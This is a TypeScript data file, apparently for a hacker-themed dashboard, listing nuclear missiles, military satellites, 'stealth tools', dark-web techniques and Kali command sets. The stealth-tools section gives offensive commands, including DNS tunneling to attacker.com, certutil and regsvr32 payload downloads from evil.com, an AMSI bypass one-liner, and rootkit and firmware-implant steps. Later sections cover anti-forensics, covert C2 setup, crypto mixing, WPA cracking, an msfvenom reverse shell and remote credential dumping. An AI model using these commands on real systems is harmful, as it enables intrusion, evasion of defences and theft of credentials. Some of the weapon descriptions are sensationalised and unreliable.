import type { AccessLevel } from './types';

// ───────────────────── NUCLEAR ARSENAL DATA ─────────────────────
export interface NukeSystem {
  id: string;
  name: string;
  country: string;
  type: 'ICBM' | 'SLBM' | 'Strategic Bomber' | 'Tactical' | 'Hypersonic' | 'MIRV';
  warheads: number;
  yield_kt: string;
  range_km: string;
  status: 'Active' | 'Retired' | 'Developing' | 'Unknown';
  description: string;
  level: AccessLevel;
}

export const nuclearArsenal: NukeSystem[] = [
  { id: 'n1', name: 'RS-28 Sarmat (Satan II)', country: 'Russia', type: 'ICBM', warheads: 15, yield_kt: '750-1000', range_km: '18,000', status: 'Active', description: 'World\'s most powerful ICBM. Can carry 15 MIRV warheads. Hypersonic Avangard glide vehicle capable.', level: 'classified' },
  { id: 'n2', name: 'LGM-30G Minuteman III', country: 'USA', type: 'ICBM', warheads: 3, yield_kt: '300-475', range_km: '13,000', status: 'Active', description: 'Backbone of US land-based nuclear deterrent. 400 missiles in silos across Montana, Wyoming, North Dakota.', level: 'researcher' },
  { id: 'n3', name: 'UGM-133 Trident II D5', country: 'USA', type: 'SLBM', warheads: 8, yield_kt: '100-475', range_km: '12,000', status: 'Active', description: 'Submarine-launched on Ohio-class subs. Most accurate SLBM ever deployed.', level: 'researcher' },
  { id: 'n4', name: 'DF-41 (Dong Feng-41)', country: 'China', type: 'ICBM', warheads: 10, yield_kt: '200-1000', range_km: '15,000', status: 'Active', description: 'China\'s most advanced ICBM. Solid-fueled with MIRV capability. Road-mobile for survivability.', level: 'classified' },
  { id: 'n5', name: 'R-36M2 Voyevoda (SS-18)', country: 'Russia', type: 'ICBM', warheads: 10, yield_kt: '550-750', range_km: '16,000', status: 'Active', description: 'NATO reporting name "Satan". Can destroy an entire US state. Being replaced by Sarmat.', level: 'classified' },
  { id: 'n6', name: 'B-2 Spirit Stealth Bomber', country: 'USA', type: 'Strategic Bomber', warheads: 16, yield_kt: 'Variable', range_km: '11,000', status: 'Active', description: 'Stealth strategic bomber capable of delivering B61 and B83 nuclear gravity bombs.', level: 'researcher' },
  { id: 'n7', name: 'Avangard Hypersonic Glide Vehicle', country: 'Russia', type: 'Hypersonic', warheads: 1, yield_kt: '800+', range_km: '6,000+', status: 'Active', description: 'Hypersonic glide vehicle capable of Mach 27. Can evade all current missile defense systems.', level: 'omega' },
  { id: 'n8', name: 'JL-3 (Ju Lang-3)', country: 'China', type: 'SLBM', warheads: 8, yield_kt: '200-1000', range_km: '12,000+', status: 'Developing', description: 'Next-gen Chinese SLBM for Type 096 submarines. Global strike capability from South China Sea.', level: 'omega' },
  { id: 'n9', name: 'B61-12 Tactical Nuclear Bomb', country: 'USA', type: 'Tactical', warheads: 1, yield_kt: '0.3-50', range_km: 'Variable', status: 'Active', description: 'Variable-yield gravity bomb. Precision-guided tail kit. Deployed in 5 NATO countries.', level: 'classified' },
  { id: 'n10', name: 'Poseidon Nuclear Torpedo', country: 'Russia', type: 'Tactical', warheads: 1, yield_kt: '2000+', range_km: '10,000', status: 'Developing', description: 'Nuclear-powered autonomous torpedo. Designed to create radioactive tsunamis on coastal cities.', level: 'omega' },
  { id: 'n11', name: 'Burevestnik Nuclear Cruise Missile', country: 'Russia', type: 'Tactical', warheads: 1, yield_kt: '100+', range_km: 'Unlimited', status: 'Developing', description: 'Nuclear-powered cruise missile with unlimited range. NATO: SSC-X-9 Skyfall.', level: 'omega' },
  { id: 'n12', name: 'Agni-VI', country: 'India', type: 'ICBM', warheads: 6, yield_kt: '200-500', range_km: '12,000', status: 'Developing', description: 'India\'s most advanced ICBM with MIRV. Full global strike capability.', level: 'classified' },
];

// ───────────────────── SATELLITE OPERATIONS DATA ─────────────────────
export interface Satellite {
  id: string;
  name: string;
  operator: string;
  type: 'Reconnaissance' | 'Communication' | 'Navigation' | 'Early Warning' | 'ELINT' | 'Weather' | 'Anti-Satellite';
  orbit: string;
  launchDate: string;
  status: 'Operational' | 'Retired' | 'Classified';
  capabilities: string[];
  level: AccessLevel;
}

export const satellites: Satellite[] = [
  { id: 's1', name: 'KH-11 KENNEN (Crystal)', operator: 'NRO/USA', type: 'Reconnaissance', orbit: 'LEO 250-450km', launchDate: 'Classified', status: 'Operational', capabilities: ['0.15m resolution', 'IR imaging', 'Real-time downlink', 'Multi-spectral'], level: 'omega' },
  { id: 's2', name: 'Lacrosse/Onyx', operator: 'NRO/USA', type: 'Reconnaissance', orbit: 'LEO 420-690km', launchDate: 'Classified', status: 'Operational', capabilities: ['SAR imaging', 'All-weather', 'Day/night', '1m resolution'], level: 'omega' },
  { id: 's3', name: 'Mentor (Advanced Orion)', operator: 'NRO/USA', type: 'ELINT', orbit: 'GEO 35,786km', launchDate: 'Classified', status: 'Operational', capabilities: ['SIGINT collection', '100m dish antenna', 'COMINT', 'ELINT'], level: 'omega' },
  { id: 's4', name: 'GPS III', operator: 'US Space Force', type: 'Navigation', orbit: 'MEO 20,200km', launchDate: '2018-2026', status: 'Operational', capabilities: ['3x accuracy', 'Anti-jam', 'Civilian L1C', 'M-code military'], level: 'public' },
  { id: 's5', name: 'SBIRS (Space-Based IR)', operator: 'US Space Force', type: 'Early Warning', orbit: 'GEO + HEO', launchDate: '2011-2025', status: 'Operational', capabilities: ['Missile launch detection', 'IR tracking', 'Theater monitoring'], level: 'classified' },
  { id: 's6', name: 'Kosmos-2576 (Luch/Olymp)', operator: 'Russia', type: 'Anti-Satellite', orbit: 'LEO 400km', launchDate: '2024', status: 'Operational', capabilities: ['Proximity operations', 'Inspector satellite', 'ASAT capability'], level: 'omega' },
  { id: 's7', name: 'Yaogan Series', operator: 'China/PLA', type: 'Reconnaissance', orbit: 'LEO + SSO', launchDate: '2006-Ongoing', status: 'Operational', capabilities: ['SAR', 'Optical', 'ELINT', 'Ocean surveillance'], level: 'classified' },
  { id: 's8', name: 'Starlink (Military Use)', operator: 'SpaceX/US DoD', type: 'Communication', orbit: 'LEO 550km', launchDate: '2024-Ongoing', status: 'Operational', capabilities: ['Starshield', 'Low latency', 'Global coverage', 'Laser interlinks'], level: 'researcher' },
  { id: 's9', name: 'GSSAP (Geosynchronous)', operator: 'US Space Force', type: 'Reconnaissance', orbit: 'GEO', launchDate: '2014-2024', status: 'Operational', capabilities: ['Rendezvous', 'Proximity ops', 'Satellite inspection', 'Threat assessment'], level: 'omega' },
  { id: 's10', name: 'X-37B Space Plane', operator: 'US Space Force', type: 'Reconnaissance', orbit: 'LEO 380km', launchDate: 'Ongoing', status: 'Operational', capabilities: ['Autonomous ops', 'Payload deployment', 'On-orbit experiments', '900+ day missions'], level: 'omega' },
  { id: 's11', name: 'RISAT-2B Series', operator: 'ISRO/India', type: 'Reconnaissance', orbit: 'LEO 550km', launchDate: '2019-2025', status: 'Operational', capabilities: ['SAR imaging', 'All-weather', 'Border surveillance', '1m resolution'], level: 'classified' },
  { id: 's12', name: 'Odin/Thor SIGINT Cluster', operator: 'NRO/USA', type: 'ELINT', orbit: 'MEO', launchDate: 'Classified', status: 'Classified', capabilities: ['Deep space SIGINT', 'Multi-satellite', 'Triangulation', 'Global coverage'], level: 'omega' },
];

// ───────────────────── INVISIBLE / STEALTH TOOLS ─────────────────────
export interface StealthTool {
  id: string;
  name: string;
  category: string;
  description: string;
  commands: string[];
  level: AccessLevel;
  hidden: boolean;
}

export const stealthTools: StealthTool[] = [
  { id: 'st1', name: 'DNS Tunneling', category: 'Exfiltration', description: 'Covert data exfiltration through DNS queries. Virtually undetectable.', commands: ['iodine -f -P secret client.tunnel.com', 'dnscat2 --dns server=attacker.com,port=53', 'dns2tcp -d 1 -z secret tunnel.com'], level: 'omega', hidden: true },
  { id: 'st2', name: 'ICMP Covert Channel', category: 'C2 Communication', description: 'Hide C2 traffic inside ICMP echo packets (ping).', commands: ['icmpsh -t target -d 500 -s 128', 'ptunnel -p proxy -lp 8000 -da target -dp 22', 'sudo python3 icmp-tunnel.py --server'], level: 'omega', hidden: true },
  { id: 'st3', name: 'Steganography Exfil', category: 'Data Exfiltration', description: 'Hide data inside images, audio, and video files. Bypasses DLP systems.', commands: ['steghide embed -cf image.jpg -ef secret.txt', 'steghide extract -sf image.jpg', 'binwalk -e suspicious.jpg'], level: 'classified', hidden: true },
  { id: 'st4', name: 'Living Off The Land', category: 'Evasion', description: 'Use built-in OS tools to avoid detection by EDR/AV.', commands: ['certutil -urlcache -split -f http://evil.com/payload.exe', 'mshta.exe javascript:a=(GetObject(\'script:http://...\')).', 'regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll'], level: 'omega', hidden: true },
  { id: 'st5', name: 'Process Hollowing', category: 'Evasion', description: 'Create suspended process, replace memory with malicious code.', commands: ['inject.exe -p explorer.exe -m payload.bin', 'Donut -i payload.dll -o shellcode.bin', 'process-hollowing -target svchost.exe -shellcode payload.bin'], level: 'omega', hidden: true },
  { id: 'st6', name: 'AMSI Bypass', category: 'Evasion', description: 'Bypass Windows Antimalware Scan Interface for PowerShell execution.', commands: ['[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)', 'amsi.fail', 'S`eT-It`em ( \'V\'+\'aR\' +  \'IA\' + \'blE:1q2\'  + \'uZx\'  )'], level: 'omega', hidden: true },
  { id: 'st7', name: 'Kernel Rootkit', category: 'Persistence', description: 'Kernel-level rootkit that hides processes, files, and network connections.', commands: ['insmod rootkit.ko', 'diamorphine --hide PID=1234', './rootkit --hide-port 4444'], level: 'omega', hidden: true },
  { id: 'st8', name: 'Firmware Backdoor', category: 'Persistence', description: 'UEFI/BIOS firmware implants that survive OS reinstallation.', commands: ['chipsec_main -m tools.uefi.s3script', 'uefi-dump -o firmware.bin', './uefi-implant --payload backdoor.efi'], level: 'omega', hidden: true },
];

// ───────────────────── CYBER ACADEMY DATA ─────────────────────
export interface Course {
  id: string;
  title: string;
  level: 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert' | 'Omega';
  duration: string;
  modules: string[];
  topics: string[];
  cert: string;
}

export const courses: Course[] = [
  { id: 'c1', title: 'Ethical Hacking Foundation', level: 'Beginner', duration: '40 Hours', modules: ['Networking Basics', 'Linux Fundamentals', 'Web Technologies', 'Introduction to Kali', 'Reconnaissance 101'], topics: ['TCP/IP', 'OSI Model', 'Bash Scripting', 'Nmap', 'OWASP Top 10'], cert: 'CEH Foundation' },
  { id: 'c2', title: 'Advanced Penetration Testing', level: 'Advanced', duration: '80 Hours', modules: ['Advanced Recon', 'Exploit Development', 'Post-Exploitation', 'Active Directory Attacks', 'Cloud Pentesting'], topics: ['Metasploit Advanced', 'Custom Exploits', 'Mimikatz', 'BloodHound', 'AWS/Azure Pentesting'], cert: 'OSCP / PNPT' },
  { id: 'c3', title: 'Malware Analysis & Reverse Engineering', level: 'Expert', duration: '60 Hours', modules: ['Static Analysis', 'Dynamic Analysis', 'Code Reversing', 'Anti-Analysis', 'Malware Dev'], topics: ['IDA Pro', 'Ghidra', 'x86/x64 Assembly', 'Windows Internals', 'API Hooking'], cert: 'CREA / GREM' },
  { id: 'c4', title: 'Cyber Threat Intelligence', level: 'Intermediate', duration: '40 Hours', modules: ['Threat Modeling', 'MITRE ATT&CK', 'OSINT Advanced', 'Dark Web Research', 'Attribution Analysis'], topics: ['Diamond Model', 'Kill Chain', 'YARA Rules', 'Threat Hunting', 'APT Groups'], cert: 'CTIA' },
  { id: 'c5', title: 'DarkBro — Master Class', level: 'Omega', duration: '120 Hours', modules: ['Zero-Day Discovery', 'Nation-State Tactics', 'Cyber Warfare', 'Satellite Hacking', 'Nuclear C2 Systems'], topics: ['Fuzzing', 'Rootkits', 'SCADA/ICS', 'SDR Exploitation', 'Quantum Cryptography'], cert: 'DOULATREX OMEGA' },
  { id: 'c6', title: 'Cloud Security Architecture', level: 'Advanced', duration: '50 Hours', modules: ['AWS Security', 'Azure Security', 'GCP Security', 'Kubernetes Security', 'Serverless Security'], topics: ['IAM', 'VPC', 'CloudTrail', 'Pod Security', 'CI/CD Pipeline'], cert: 'CCSP / AWS Security' },
  { id: 'c7', title: 'Red Team Operations', level: 'Expert', duration: '90 Hours', modules: ['C2 Infrastructure', 'Initial Access', 'Persistence', 'Lateral Movement', 'Data Exfiltration'], topics: ['Cobalt Strike', 'Covenant', 'Sliver', 'Domain Escalation', 'Exfiltration over C2'], cert: 'CRTO / OSEP' },
  { id: 'c8', title: 'ICS/SCADA Security', level: 'Advanced', duration: '45 Hours', modules: ['PLC Fundamentals', 'Modbus/DNP3', 'HMI Exploitation', 'Grid Security', 'Nuclear Facility Security'], topics: ['Siemens S7', 'Modbus TCP', 'Stuxnet Analysis', 'NERC CIP', 'IEC 62443'], cert: 'GICSP' },
];

// ───────────────────── CYBER WEBSITES DIRECTORY ─────────────────────
export interface CyberSite {
  id: string;
  name: string;
  url: string;
  category: string;
  description: string;
  free: boolean;
  requiresOnion: boolean;
}

export const cyberSites: CyberSite[] = [
  { id: 'w1', name: 'HackTheBox', url: 'https://hackthebox.com', category: 'Practice Labs', description: 'Leading cybersecurity training platform with vulnerable machines and challenges.', free: true, requiresOnion: false },
  { id: 'w2', name: 'TryHackMe', url: 'https://tryhackme.com', category: 'Practice Labs', description: 'Beginner-friendly cybersecurity training with guided rooms and pathways.', free: true, requiresOnion: false },
  { id: 'w3', name: 'Exploit Database', url: 'https://exploit-db.com', category: 'Exploits', description: 'Archive of public exploits and vulnerable software — Offensive Security.', free: true, requiresOnion: false },
  { id: 'w4', name: 'Shodan', url: 'https://shodan.io', category: 'OSINT', description: 'Search engine for Internet-connected devices: cameras, ICS, databases.', free: true, requiresOnion: false },
  { id: 'w5', name: 'Censys', url: 'https://censys.io', category: 'OSINT', description: 'Internet asset discovery and security research platform.', free: true, requiresOnion: false },
  { id: 'w6', name: 'VirusTotal', url: 'https://virustotal.com', category: 'Malware Analysis', description: 'Analyze suspicious files and URLs with 70+ antivirus engines.', free: true, requiresOnion: false },
  { id: 'w7', name: 'Dread Forum', url: 'dreadytofatroptsd.onion', category: 'Dark Web', description: 'Reddit-like darknet discussion forum (Tor required).', free: true, requiresOnion: true },
  { id: 'w8', name: 'Intel Exchange', url: 'intelx.io', category: 'OSINT', description: 'Intelligence X — search engine for data leaks, dark web, and document archives.', free: true, requiresOnion: false },
  { id: 'w9', name: 'DeHashed', url: 'https://dehashed.com', category: 'OSINT', description: 'Breached database search engine. Find compromised credentials.', free: true, requiresOnion: false },
  { id: 'w10', name: 'CyberChef', url: 'https://gchq.github.io/CyberChef', category: 'Tools', description: 'The Cyber Swiss Army Knife — GCHQ\'s data transformation tool.', free: true, requiresOnion: false },
  { id: 'w11', name: 'AlienVault OTX', url: 'https://otx.alienvault.com', category: 'Threat Intel', description: 'Open Threat Exchange — collaborative threat intelligence platform.', free: true, requiresOnion: false },
  { id: 'w12', name: 'MITRE ATT&CK', url: 'https://attack.mitre.org', category: 'Framework', description: 'Globally-accessible knowledge base of adversary tactics and techniques.', free: true, requiresOnion: false },
  { id: 'w13', name: 'CrackStation', url: 'https://crackstation.net', category: 'Cracking', description: 'Free password hash cracking with massive lookup tables.', free: true, requiresOnion: false },
  { id: 'w14', name: 'GreyNoise', url: 'https://greynoise.io', category: 'Threat Intel', description: 'Analyze IPs to separate targeted attacks from background noise.', free: true, requiresOnion: false },
  { id: 'w15', name: 'URLScan.io', url: 'https://urlscan.io', category: 'Analysis', description: 'Scan and analyze websites — see what a website does before visiting.', free: true, requiresOnion: false },
  { id: 'w16', name: 'SecurityTrails', url: 'https://securitytrails.com', category: 'OSINT', description: 'DNS, domain, and IP intelligence for attack surface discovery.', free: true, requiresOnion: false },
];

// ───────────────────── DARK WEB TECHNIQUES ─────────────────────
export interface DarkTechnique {
  id: string;
  title: string;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  category: string;
  steps: string[];
  tools: string[];
  warning: string;
}

export const darkTechniques: DarkTechnique[] = [
  { id: 'dt1', title: 'TOR Circuit Setup', difficulty: 'Easy', category: 'Anonymity', steps: ['Install Tor: apt install tor', 'Configure torrc for bridges', 'Start service: systemctl start tor', 'Verify: curl --socks5 127.0.0.1:9050 ifconfig.me', 'Use proxychains with Tor'], tools: ['tor', 'proxychains', 'torsocks'], warning: 'TOR does not provide full anonymity alone. Use TAILS or Whonix for operational security.' },
  { id: 'dt2', title: 'TAILS OS Deployment', difficulty: 'Easy', category: 'Anonymity', steps: ['Download TAILS from tails.net', 'Verify PGP signature', 'Flash to USB with BalenaEtcher', 'Boot from USB', 'Configure persistent storage', 'Connect to Tor automatically'], tools: ['TAILS OS', 'BalenaEtcher', 'GPG'], warning: 'Always verify the ISO signature before use to prevent compromise.' },
  { id: 'dt3', title: 'Onion Service Discovery', difficulty: 'Medium', category: 'Reconnaissance', steps: ['Use Ahmia.fi search engine', 'Search dark.fail for verified links', 'Monitor dread forum for new services', 'Use TorBot for automated crawling', 'Map connections with maltego'], tools: ['TorBot', 'Maltego', 'Ahmia', 'OnionScan'], warning: 'Many .onion sites contain illegal content. Only explore for research purposes.' },
  { id: 'dt4', title: 'PGP Encrypted Communication', difficulty: 'Medium', category: 'Encryption', steps: ['Generate keypair: gpg --gen-key', 'Export public key: gpg --export -a', 'Import contact key: gpg --import key.asc', 'Encrypt message: gpg -e -r recipient message.txt', 'Decrypt: gpg -d message.gpg'], tools: ['GPG', 'Kleopatra', 'OpenKeychain'], warning: 'Never share private keys. Use air-gapped machine for sensitive key generation.' },
  { id: 'dt5', title: 'Anonymous Cryptocurrency', difficulty: 'Medium', category: 'Finance', steps: ['Acquire Monero (XMR) for privacy', 'Use Wasabi/JoinMarket for BTC mixing', 'Set up Samourai Whirlpool', 'Use Bisq DEX for anonymous trading', 'Never KYC on privacy coins'], tools: ['Monero', 'Wasabi Wallet', 'Samourai', 'Bisq'], warning: 'Cryptocurrency transactions on public blockchains are traceable. Use privacy coins.' },
  { id: 'dt6', title: 'Secure Dark Web Marketplace', difficulty: 'Hard', category: 'Operational', steps: ['Use Whonix gateway for isolation', 'Verify PGP signed addresses', 'Use multi-sig escrow', 'PGP encrypt all communications', 'Use dead-drop locations'], tools: ['Whonix', 'GPG', 'Electrum', 'Monero CLI'], warning: 'Marketplaces are honeypots. Law enforcement operates many. Educational research only.' },
  { id: 'dt7', title: 'Anti-Forensics & Covering Tracks', difficulty: 'Hard', category: 'OPSEC', steps: ['Use full disk encryption (LUKS/Veracrypt)', 'Wipe free space: sfill /', 'Secure delete: srm -r /tmp/*', 'Clear bash history: shred ~/.bash_history', 'Use RAM-only OS (TAILS)', 'Metadata removal: mat2 file.pdf'], tools: ['LUKS', 'Veracrypt', 'Secure Delete', 'MAT2', 'ExifTool'], warning: 'SSDs make secure deletion difficult due to wear leveling. Physical destruction is most reliable.' },
  { id: 'dt8', title: 'Covert C2 Infrastructure', difficulty: 'Expert', category: 'Infrastructure', steps: ['Register domain with crypto', 'Use bulletproof hosting', 'Domain fronting via CDN', 'Setup redirectors chain', 'SSL/TLS tunneling', 'SOCKS5 proxy chain', 'Dynamic DNS rotation'], tools: ['Cobalt Strike', 'Empire', 'Mythic', 'Redirectors', 'CloudFront'], warning: 'C2 infrastructure for unauthorized access is illegal. Use only in authorized penetration tests.' },
];

// ───────────────────── KALI ADVANCED MODULES ─────────────────────
export interface KaliModule {
  id: string;
  name: string;
  category: string;
  description: string;
  commands: { cmd: string; desc: string }[];
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert';
}

export const kaliModules: KaliModule[] = [
  { id: 'k1', name: 'Kali Meta-Packages', category: 'Setup', description: 'Install entire tool categories with single commands', commands: [{ cmd: 'sudo apt install kali-linux-headless', desc: 'Headless — no GUI, core tools' }, { cmd: 'sudo apt install kali-linux-default', desc: 'Default desktop + common tools' }, { cmd: 'sudo apt install kali-linux-large', desc: 'Extended tools for professionals' }, { cmd: 'sudo apt install kali-linux-everything', desc: 'All 600+ tools — 20GB download' }, { cmd: 'sudo apt install kali-tools-top10', desc: 'Top 10 most used tools only' }, { cmd: 'sudo apt install kali-tools-web', desc: 'Web application testing tools' }, { cmd: 'sudo apt install kali-tools-wireless', desc: 'Wireless hacking toolkit' }, { cmd: 'sudo apt install kali-tools-exploitation', desc: 'Exploitation & post-exploitation' }], difficulty: 'Beginner' },
  { id: 'k2', name: 'Information Gathering Suite', category: 'Reconnaissance', description: 'Complete OSINT and reconnaissance workflow', commands: [{ cmd: 'amass enum -d target.com -o results.txt', desc: 'Subdomain enumeration with OWASP Amass' }, { cmd: 'subfinder -d target.com -all', desc: 'Passive subdomain discovery' }, { cmd: 'theharvester -d target.com -b google,linkedin,shodan', desc: 'Multi-source email & host gathering' }, { cmd: 'recon-ng -w workspace_name', desc: 'Web reconnaissance framework' }, { cmd: 'shodan search \'org:"target" port:22\'', desc: 'Shodan organizational search' }, { cmd: 'photon -u https://target.com -o target_scan', desc: 'Crawl for OSINT: URLs, emails, files' }], difficulty: 'Intermediate' },
  { id: 'k3', name: 'Wireless Attack Arsenal', category: 'Wireless', description: 'Complete WiFi, Bluetooth, and RF hacking toolkit', commands: [{ cmd: 'airmon-ng start wlan0', desc: 'Enable monitor mode' }, { cmd: 'airodump-ng wlan0mon -w capture', desc: 'Capture handshakes' }, { cmd: 'aircrack-ng -w rockyou.txt capture.cap', desc: 'Crack WPA2 handshake' }, { cmd: 'bettercap -iface wlan0', desc: 'MITM framework' }, { cmd: 'hcxdumptool -o capture.pcapng -i wlan0', desc: 'Capture PMKID hashes' }, { cmd: 'reaver -i wlan0mon -b BSSID -vv', desc: 'WPS PIN brute force' }], difficulty: 'Intermediate' },
  { id: 'k4', name: 'Web Exploitation Mastery', category: 'Web Application', description: 'Advanced web application penetration testing', commands: [{ cmd: 'sqlmap -u "url?id=1" --dbs --batch', desc: 'Automated SQL injection' }, { cmd: 'ffuf -u https://target.com/FUZZ -w wordlist.txt', desc: 'Directory & file fuzzing' }, { cmd: 'xsstrike -u "https://target.com?q=test"', desc: 'Advanced XSS detection & exploitation' }, { cmd: 'wpscan --url https://target.com --enumerate ap,at,cb,dbe', desc: 'Full WordPress enumeration' }, { cmd: 'nikto -h https://target.com -ssl -Format html', desc: 'Web server vulnerability scan' }, { cmd: 'commix --url="https://target.com?cmd="', desc: 'Command injection exploitation' }], difficulty: 'Advanced' },
  { id: 'k5', name: 'Exploit Development', category: 'Exploitation', description: 'Buffer overflows, ROP chains, and shellcoding', commands: [{ cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f c', desc: 'Generate shellcode' }, { cmd: 'gdb -q ./vulnerable', desc: 'Debug binary for exploitation' }, { cmd: 'python3 -c "print(\'A\'*offset + \'\\xaddr\')" | ./vuln', desc: 'Buffer overflow PoC' }, { cmd: 'ROPgadget --binary ./vuln', desc: 'Find ROP gadgets' }, { cmd: 'checksec --file=./vuln', desc: 'Check binary protections' }], difficulty: 'Expert' },
  { id: 'k6', name: 'Post-Exploitation & Lateral Movement', category: 'Post-Exploitation', description: 'Move laterally and escalate privileges', commands: [{ cmd: 'bloodhound-python -d domain.local -u user -p pass -ns DC_IP', desc: 'AD enumeration for attack paths' }, { cmd: 'crackmapexec smb 10.0.0.1/24', desc: 'SMB scanning for vulnerable hosts' }, { cmd: 'impacket-secretsdump domain/user:pass@target', desc: 'Dump credentials remotely' }, { cmd: 'impacket-psexec domain/admin:pass@target', desc: 'Remote code execution', }], difficulty: 'Advanced' },
];
